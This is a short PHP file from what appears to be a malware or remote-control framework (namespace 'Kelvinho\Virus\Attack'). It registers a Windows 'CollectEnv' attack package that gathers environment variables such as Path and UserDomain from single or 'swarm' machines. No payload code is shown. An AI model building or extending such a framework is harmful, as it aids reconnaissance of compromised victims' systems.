<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.CollectEnv", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectEnv\\CollectEnv", "easy.CollectEnv", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Collect environmental variables, like JAVA_PATH, Path, UserDomain, etc.");
